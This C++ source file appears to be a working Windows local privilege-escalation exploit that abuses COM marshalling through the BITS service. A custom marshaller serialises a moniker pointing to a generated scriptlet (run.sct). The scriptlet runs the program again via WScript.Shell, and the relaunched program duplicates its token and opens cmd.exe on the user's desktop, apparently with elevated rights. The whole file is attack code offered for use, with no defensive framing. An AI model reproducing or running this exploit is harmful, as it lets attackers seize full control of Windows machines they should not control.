

#include "stdafx.h"
#include <bits.h>
#include <bits4_0.h>
#include <tchar.h>
#include <lm.h>
#include <string>
#include <comdef.h>
#include <winternl.h>
#include <Shlwapi.h>
#include <strsafe.h>
#include <vector>
#include <Sddl.h>


#pragma comment(lib, "shlwapi.lib")

//myguid
GUID IID_Imytestcom = { 0xE80A6EC1, 0x39FB, 0x462A, { 0xA5, 0x6C, 0x41, 0x1E, 0xE9, 0xFC, 0x1A, 0xEB } };
GUID IID_ITMediaControl = { 0xc445dde8, 0x5199, 0x4bc7, { 0x98, 0x07, 0x5f, 0xfb, 0x92, 0xe4, 0x2e, 0x09 } };
//ole32guid
GUID CLSID_AggStdMarshal2 = { 0x00000027, 0x0000, 0x0008, { 0xc0, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x46 } };
GUID CLSID_FreeThreadedMarshaller = { 0x0000033A, 0x0000, 0x0000, { 0xC0, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x46 } };
GUID CLSID_StubMYTestCom = { 0x00020424, 0x0000, 0x0000, { 0xC0, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x46, } };

GUID IID_IStdIdentity = { 0x0000001b, 0x0000, 0x0000, { 0xC0, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x46 } };
GUID IID_IMarshalOptions = { 0X4C1E39E1, 0xE3E3, 0x4296, { 0xAA, 0x86, 0xEC, 0x93, 0x8D, 0x89, 0x6E, 0x92 } };
GUID CLSID_DfMarshal = { 0x0000030B, 0x0000, 0x0000, { 0xC0, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x46 } };
GUID IID_IStdFreeMarshal = { 0x000001d0, 0x0000, 0x0000, { 0xC0, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x46 } };
//GUID IID_IStdMarshalInfo = { 0x00000018, 0x0000, 0x0000, { 0xC0, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x46,} };
//GUID IID_IExternalConnection = { 0x00000019, 0x0000, 0x0000, { 0xC0, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x46,} };
//GUID  IID_IStdFreeMarshal = { 0x000001d0, 0x0000, 0x0000, { 0xC0, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x46 } };
//GUID IID_IProxyManager = { 0x00000008, 0x0000, 0x0000, { 0xC0, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x46 } };
GUID  CLSID_StdWrapper = { 0x00000336, 0x0000, 0x0000, { 0xC0, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x46 } };
GUID  CLSID_StdWrapperNoHeader = { 0x00000350, 0x0000, 0x0000, { 0xC0, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x46 } };
GUID	IID_IObjContext = { 0x051372ae0, 0xcae7, 0x11cf, { 0xbe, 0x81, 0x00, 0xaa, 0x00, 0xa2, 0xfa, 0x25 } };
//program


static bstr_t IIDToBSTR(REFIID riid)
{
	LPOLESTR str;
	bstr_t ret = "Unknown";
	if (SUCCEEDED(StringFromIID(riid, &str)))
	{
		ret = str;
		CoTaskMemFree(str);
	}
	return ret;
}


typedef   HRESULT(__stdcall *CoCreateObjectInContext)(IUnknown *pServer, IUnknown *pCtx, _GUID *riid, void **ppv);
typedef HRESULT(__stdcall *CreateProxyFromTypeInfo)(ITypeInfo* pTypeInfo, IUnknown* pUnkOuter, REFIID riid, IRpcProxyBuffer** ppProxy, void** ppv);
typedef HRESULT(__stdcall *CreateStubFromTypeInfo)(ITypeInfo* pTypeInfo, REFIID riid, IUnknown* pUnkServer, IRpcStubBuffer** ppStub);




DEFINE_GUID(IID_ISecurityCallContext, 0xcafc823e, 0xb441, 0x11d1, 0xb8, 0x2b, 0x00, 0x00, 0xf8, 0x75, 0x7e, 0x2a);
DEFINE_GUID(IID_IObjectContext, 0x51372ae0, 0xcae7, 0x11cf, 0xbe, 0x81, 0x00, 0xaa, 0x00, 0xa2, 0xfa, 0x25);
_COM_SMARTPTR_TYPEDEF(IBackgroundCopyJob, __uuidof(IBackgroundCopyJob));
_COM_SMARTPTR_TYPEDEF(IBackgroundCopyManager, __uuidof(IBackgroundCopyManager));




class CMarshaller : public IMarshal
{
	LONG _ref_count;
	IUnknown * _unk;

	~CMarshaller() {}

public:

	CMarshaller(IUnknown * unk) : _ref_count(1)
	{
		_unk = unk;

	}


	virtual HRESULT STDMETHODCALLTYPE QueryInterface(
		/* [in] */ REFIID riid,
		/* [iid_is][out] */ _COM_Outptr_ void __RPC_FAR *__RPC_FAR *ppvObject)
	{

		*ppvObject = nullptr;
		printf("QI [CMarshaller] - Marshaller: %ls %p\n", IIDToBSTR(riid).GetBSTR(), this);

		if (riid == IID_IUnknown)
		{
			*ppvObject = this;
		}
		else if (riid == IID_IMarshal)
		{
			*ppvObject = static_cast<IMarshal*>(this);
		}
		else
		{
			return E_NOINTERFACE;
		}
		printf("Queried Success: %p\n", *ppvObject);
		((IUnknown *)*ppvObject)->AddRef();
		return S_OK;
	}

	virtual ULONG STDMETHODCALLTYPE AddRef(void)
	{

		printf("AddRef: %d\n", _ref_count);
		return InterlockedIncrement(&_ref_count);
	}

	virtual ULONG STDMETHODCALLTYPE Release(void)
	{

		printf("Release: %d\n", _ref_count);
		ULONG ret = InterlockedDecrement(&_ref_count);
		if (ret == 0)
		{
			printf("Release object %p\n", this);
			delete this;
		}
		return ret;
	}



	virtual HRESULT STDMETHODCALLTYPE GetUnmarshalClass(
		/* [annotation][in] */
		_In_  REFIID riid,
		/* [annotation][unique][in] */
		_In_opt_  void *pv,
		/* [annotation][in] */
		_In_  DWORD dwDestContext,
		/* [annotation][unique][in] */
		_Reserved_  void *pvDestContext,
		/* [annotation][in] */
		_In_  DWORD mshlflags,
		/* [annotation][out] */
		_Out_  CLSID *pCid)
	{

		//CLSIDFromString(L"{E80A6EC1-39FB-462A-A56C-411EE9FC1AEB}", pCid);
		printf("Call:  GetUnmarshalClass\n");
		GUID marshalInterceptorGUID = { 0xecabafcb, 0x7f19, 0x11d2, { 0x97, 0x8e, 0x00, 0x00, 0xf8, 0x75, 0x7e, 0x2a } };
		*pCid = marshalInterceptorGUID; // ECABAFCB-7F19-11D2-978E-0000F8757E2A
		return S_OK;
	}
	virtual HRESULT STDMETHODCALLTYPE MarshalInterface(
		/* [annotation][unique][in] */
		_In_  IStream *pStm,
		/* [annotation][in] */
		_In_  REFIID riid,
		/* [annotation][unique][in] */
		_In_opt_  void *pv,
		/* [annotation][in] */
		_In_  DWORD dwDestContext,
		/* [annotation][unique][in] */
		_Reserved_  void *pvDestContext,
		/* [annotation][in] */
		_In_  DWORD mshlflags)
	{

		printf("Marshal marshalInterceptorGUID Interface: %ls\n", IIDToBSTR(riid).GetBSTR());
		GUID marshalInterceptorGUID = { 0xecabafcb, 0x7f19, 0x11d2, { 0x97, 0x8e, 0x00, 0x00, 0xf8, 0x75, 0x7e, 0x2a } };
		printf("Call:  MarshalInterface\n");
		ULONG written = 0;
		HRESULT hr = 0;
		IMonikerPtr scriptMoniker;
		IMonikerPtr newMoniker;
		IBindCtxPtr context;
		GUID compositeMonikerGUID = { 0x00000309, 0x0000, 0x0000, { 0xc0, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x46 } };
		UINT header[] = { 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00 };
		UINT monikers[] = { 0x02, 0x00, 0x00, 0x00 };
		GUID newMonikerGUID = { 0xecabafc6, 0x7f19, 0x11d2, { 0x97, 0x8e, 0x00, 0x00, 0xf8, 0x75, 0x7e, 0x2a } };
		pStm->Write(header, 12, &written);
		pStm->Write(GuidToByteArray(marshalInterceptorGUID), 16, &written);
		pStm->Write(monikers, 4, &written);
		pStm->Write(GuidToByteArray(compositeMonikerGUID), 16, &written);
		pStm->Write(monikers, 4, &written);
		hr = CreateBindCtx(0, &context);
		ULONG cchEaten;		
		//hr = MkParseDisplayName(context, L"script:"+ GetExeDirMarshal() + L"\\run.sct", &cchEaten, &scriptMoniker);
		hr = MkParseDisplayName(context, GetExeDirMarshal() + L"\\run.sct", &cchEaten, &scriptMoniker);
		hr = CoCreateInstance(newMonikerGUID, NULL, CLSCTX_ALL, IID_IUnknown, (LPVOID*)&newMoniker);
		hr = OleSaveToStream(scriptMoniker, pStm);
		hr = OleSaveToStream(newMoniker, pStm);
		return hr;

	}
	bstr_t GetExeDirMarshal()
	{
		WCHAR curr_path[MAX_PATH] = { 0 };
		GetModuleFileName(nullptr, curr_path, MAX_PATH);
		PathRemoveFileSpec(curr_path);

		return curr_path;
	}
	unsigned char const* GuidToByteArray(GUID const& g)
	{
		return reinterpret_cast<unsigned char const*>(&g);
	}
	virtual HRESULT STDMETHODCALLTYPE GetMarshalSizeMax(
		/* [annotation][in] */
		_In_  REFIID riid,
		/* [annotation][unique][in] */
		_In_opt_  void *pv,
		/* [annotation][in] */
		_In_  DWORD dwDestContext,
		/* [annotation][unique][in] */
		_Reserved_  void *pvDestContext,
		/* [annotation][in] */
		_In_  DWORD mshlflags,
		/* [annotation][out] */
		_Out_  DWORD *pSize)
	{
		*pSize = 1024;
		return S_OK;
	}

	virtual HRESULT STDMETHODCALLTYPE UnmarshalInterface(
		/* [annotation][unique][in] */
		_In_  IStream *pStm,
		/* [annotation][in] */
		_In_  REFIID riid,
		/* [annotation][out] */
		_Outptr_  void **ppv)
	{
		return E_NOTIMPL;
	}

	virtual HRESULT STDMETHODCALLTYPE ReleaseMarshalData(
		/* [annotation][unique][in] */
		_In_  IStream *pStm)
	{
		return S_OK;
	}

	virtual HRESULT STDMETHODCALLTYPE DisconnectObject(
		/* [annotation][in] */
		_In_  DWORD dwReserved)
	{
		return S_OK;
	}
};







class FakeObject : public IBackgroundCopyCallback2, public IPersist
{
	HANDLE m_ptoken;
	LONG m_lRefCount;
	IUnknown *_umk;
	~FakeObject() {};

public:
	//Constructor, Destructor
	FakeObject(IUnknown *umk) {
		_umk = umk;
		m_lRefCount = 1;

	}

	//IUnknown
	HRESULT __stdcall QueryInterface(REFIID riid, LPVOID *ppvObj)
	{


		printf("QI [FakeObject] - Marshaller: %ls %p\n", IIDToBSTR(riid).GetBSTR(), this);
		if (riid == __uuidof(IUnknown))
		{
			printf("Query for IUnknown\n");
			*ppvObj = this;
		}
		else if (riid == __uuidof(IBackgroundCopyCallback2))
		{
			printf("Query for IBackgroundCopyCallback2\n");

		}
		else if (riid == __uuidof(IBackgroundCopyCallback))
		{
			printf("Query for IBackgroundCopyCallback\n");

		}
		else if (riid == __uuidof(IPersist))
		{
			printf("Query for IPersist\n");
			*ppvObj = static_cast<IPersist*>(this);
			//*ppvObj = _unk2;
		}
		else if (riid == IID_ITMediaControl)
		{
			printf("Query for ITMediaControl\n");
			*ppvObj = static_cast<IPersist*>(this);
			//*ppvObj = this;

		}
		else if (riid == CLSID_AggStdMarshal2)
		{
			printf("Query for CLSID_AggStdMarshal2\n");
			*ppvObj = (this);
		}
		else if (riid == IID_IMarshal)
		{
			printf("Query for IID_IMarshal\n");
			//*ppvObj = static_cast<IBackgroundCopyCallback2*>(this);


			*ppvObj = NULL;
			return E_NOINTERFACE;
		}

		else if (riid == IID_IMarshalOptions)
		{
			printf("PrivateTarProxy IID_IMarshalOptions  IID: %ls %p\n", IIDToBSTR(riid).GetBSTR(), this);



			ppvObj = NULL;

			return E_NOINTERFACE;




		}
		else
		{
			printf("Unknown IID: %ls %p\n", IIDToBSTR(riid).GetBSTR(), this);
			*ppvObj = NULL;
			return E_NOINTERFACE;
		}

		((IUnknown *)*ppvObj)->AddRef();
		return NOERROR;
	}

	ULONG __stdcall AddRef()
	{
		return InterlockedIncrement(&m_lRefCount);
	}

	ULONG __stdcall Release()
	{
		ULONG  ulCount = InterlockedDecrement(&m_lRefCount);

		if (0 == ulCount)
		{
			delete this;
		}

		return ulCount;
	}

	virtual HRESULT STDMETHODCALLTYPE JobTransferred(
		/* [in] */ __RPC__in_opt IBackgroundCopyJob *pJob)
	{
		printf("JobTransferred\n");
		return S_OK;
	}

	virtual HRESULT STDMETHODCALLTYPE JobError(
		/* [in] */ __RPC__in_opt IBackgroundCopyJob *pJob,
		/* [in] */ __RPC__in_opt IBackgroundCopyError *pError)
	{
		printf("JobError\n");
		return S_OK;
	}


	virtual HRESULT STDMETHODCALLTYPE JobModification(
		/* [in] */ __RPC__in_opt IBackgroundCopyJob *pJob,
		/* [in] */ DWORD dwReserved)
	{
		printf("JobModification\n");
		return S_OK;
	}


	virtual HRESULT STDMETHODCALLTYPE FileTransferred(
		/* [in] */ __RPC__in_opt IBackgroundCopyJob *pJob,
		/* [in] */ __RPC__in_opt IBackgroundCopyFile *pFile)
	{
		printf("FileTransferred\n");
		return S_OK;
	}

	virtual HRESULT STDMETHODCALLTYPE GetClassID(
		/* [out] */ __RPC__out CLSID *pClassID)
	{
		printf("GetClassID\n");


		*pClassID = GUID_NULL;

		return S_OK;
	}
};


class ScopedHandle
{
	HANDLE _h;
public:
	ScopedHandle() : _h(nullptr)
	{
	}

	ScopedHandle(ScopedHandle&) = delete;

	ScopedHandle(ScopedHandle&& h) {
		_h = h._h;
		h._h = nullptr;
	}

	~ScopedHandle()
	{
		if (!invalid())
		{
			CloseHandle(_h);
			_h = nullptr;
		}
	}

	bool invalid() {
		return (_h == nullptr) || (_h == INVALID_HANDLE_VALUE);
	}

	void set(HANDLE h)
	{
		_h = h;
	}

	HANDLE get()
	{
		return _h;
	}

	HANDLE* ptr()
	{
		return &_h;
	}


};



_COM_SMARTPTR_TYPEDEF(IEnumBackgroundCopyJobs, __uuidof(IEnumBackgroundCopyJobs));

void TestBits(HANDLE hEvent)
{
	IBackgroundCopyManagerPtr pQueueMgr;
	IID CLSID_BackgroundCopyManager;
	IID IID_IBackgroundCopyManager;
	CLSIDFromString(L"{4991d34b-80a1-4291-83b6-3328366b9097}", &CLSID_BackgroundCopyManager);
	CLSIDFromString(L"{5ce34c0d-0dc9-4c1f-897c-daa1b78cee7c}", &IID_IBackgroundCopyManager);

	HRESULT	hr = CoCreateInstance(CLSID_BackgroundCopyManager, NULL,
		CLSCTX_ALL, IID_IBackgroundCopyManager, (void**)&pQueueMgr);

	IUnknown * pOuter = new CMarshaller(static_cast<IPersist*>(new FakeObject(nullptr)));
	IUnknown * pInner;

	CoGetStdMarshalEx(pOuter, CLSCTX_INPROC_SERVER, &pInner);

	IBackgroundCopyJobPtr pJob;
	GUID guidJob;

	IEnumBackgroundCopyJobsPtr enumjobs;
	hr = pQueueMgr->EnumJobsW(0, &enumjobs);
	if (SUCCEEDED(hr))
	{
		IBackgroundCopyJob* currjob;
		ULONG fetched = 0;

		while ((enumjobs->Next(1, &currjob, &fetched) == S_OK) && (fetched == 1))
		{
			LPWSTR lpStr;
			if (SUCCEEDED(currjob->GetDisplayName(&lpStr)))
			{
				if (wcscmp(lpStr, L"BitsAuthSample") == 0)
				{
					CoTaskMemFree(lpStr);
					currjob->Cancel();
					currjob->Release();
					break;
				}
			}
			currjob->Release();
		}
	}


	pQueueMgr->CreateJob(L"BitsAuthSample",
		BG_JOB_TYPE_DOWNLOAD,
		&guidJob,
		&pJob);



	IUnknownPtr pNotify;


	pNotify.Attach(new CMarshaller(pInner));
	{

		
		HRESULT hr = pJob->SetNotifyInterface(pNotify);
		printf("Result: %08X\n", hr);

	}
	if (pJob)
	{
		pJob->Cancel();
	}

	printf("Done\n");
	SetEvent(hEvent);
}



bstr_t GetExeDir()
{
	WCHAR curr_path[MAX_PATH] = { 0 };
	GetModuleFileName(nullptr, curr_path, MAX_PATH);
	PathRemoveFileSpec(curr_path);

	return curr_path;
}


void WriteFile(bstr_t path, const std::vector<BYTE> data)
{
	ScopedHandle hFile;
	hFile.set(CreateFile(path, GENERIC_WRITE, 0, nullptr, CREATE_ALWAYS, 0, nullptr));
	if (hFile.invalid())
	{
		throw _com_error(E_FAIL);
	}

	if (data.size() > 0)
	{
		DWORD bytes_written;
		if (!WriteFile(hFile.get(), data.data(), data.size(), &bytes_written, nullptr) || bytes_written != data.size())
		{
			throw _com_error(E_FAIL);
		}
	}



}

void WriteFile(bstr_t path, const char* data)
{
	const BYTE* bytes = reinterpret_cast<const BYTE*>(data);
	std::vector<BYTE> data_buf(bytes, bytes + strlen(data));
	WriteFile(path, data_buf);
}

std::vector<BYTE> ReadFile(bstr_t path)
{
	ScopedHandle hFile;
	hFile.set(CreateFile(path, GENERIC_READ, 0, nullptr, OPEN_EXISTING, 0, nullptr));
	if (hFile.invalid())
	{
		throw _com_error(E_FAIL);
	}
	DWORD size = GetFileSize(hFile.get(), nullptr);
	std::vector<BYTE> ret(size);
	if (size > 0)
	{
		DWORD bytes_read;
		if (!ReadFile(hFile.get(), ret.data(), size, &bytes_read, nullptr) || bytes_read != size)
		{
			throw _com_error(E_FAIL);
		}
	}

	return ret;
}


bstr_t GetExe()
{
	WCHAR curr_path[MAX_PATH] = { 0 };
	GetModuleFileName(nullptr, curr_path, MAX_PATH);
	return curr_path;
}



const wchar_t x[] = L"ABC";

const wchar_t scriptlet_start[] = L"<?xml version='1.0'?>\r\n<package>\r\n<component id='giffile'>\r\n<registration description='Dummy' progid='giffile' version='1.00' remotable='True'>\r\n</registration>\r\n<script language='JScript'>\r\n<![CDATA[\r\n  new ActiveXObject('Wscript.Shell').exec('";

const wchar_t scriptlet_end[] = L"');\r\n]]>\r\n</script>\r\n</component>\r\n</package>\r\n";

bstr_t CreateScriptletFile()
{
	bstr_t script_file = GetExeDir() + L"\\run.sct";
	DeleteFile(script_file);
	bstr_t script_data = scriptlet_start;
	bstr_t exe_file = GetExe();
	wchar_t* p = exe_file;
	while (*p)
	{
		if (*p == '\\')
		{
			*p = '/';
		}
		p++;
	}

	DWORD session_id;
	ProcessIdToSessionId(GetCurrentProcessId(), &session_id);
	WCHAR session_str[16];
	StringCchPrintf(session_str, _countof(session_str), L"%d", session_id);

	script_data += L"\"" + exe_file + L"\" " + session_str + scriptlet_end;

	WriteFile(script_file, script_data);

	return script_file;
}

void CreateNewProcess(const wchar_t* session)
{
	DWORD session_id = wcstoul(session, nullptr, 0);
	ScopedHandle token;
	if (!OpenProcessToken(GetCurrentProcess(), TOKEN_ALL_ACCESS, token.ptr()))
	{
		throw _com_error(E_FAIL);
	}

	ScopedHandle new_token;

	if (!DuplicateTokenEx(token.get(), TOKEN_ALL_ACCESS, nullptr, SecurityAnonymous, TokenPrimary, new_token.ptr()))
	{
		throw _com_error(E_FAIL);
	}

	SetTokenInformation(new_token.get(), TokenSessionId, &session_id, sizeof(session_id));

	STARTUPINFO start_info = {};
	start_info.cb = sizeof(start_info);
	start_info.lpDesktop = L"WinSta0\\Default";
	PROCESS_INFORMATION proc_info;
	WCHAR cmdline[] = L"cmd.exe";
	if (CreateProcessAsUser(new_token.get(), nullptr, cmdline,
		nullptr, nullptr, FALSE, CREATE_NEW_CONSOLE, nullptr, nullptr, &start_info, &proc_info))
	{
		CloseHandle(proc_info.hProcess);
		CloseHandle(proc_info.hThread);
	}
}





const LPCOLESTR Tapi3tlb_path = L"C:\\dl\\cve\\Windows\\System32\\tapi3.dll";
int _tmain(int argc, _TCHAR* argv[])
{
	try
	{

		CreateScriptletFile();
		if (argc > 1)
		{
			CreateNewProcess(argv[1]);
		}
		else
		{
			HANDLE	hTokenTmp = 0;
			HANDLE hEvent = CreateEvent(NULL, FALSE, FALSE, NULL);
			HRESULT hr = 0;
			hr = CoInitialize(NULL);


			
			if (FAILED(hr))
			{
				return false;
			}


			TestBits(hEvent);

			char szInput[64];
			scanf_s("%[a-z0-9]", szInput);
			CloseHandle(hEvent);
		}
	}
	catch (const _com_error& err)
	{
		printf("Error: %ls\n", err.ErrorMessage());
	}
	CoUninitialize();// Õ∑≈COM
	return 0;
}
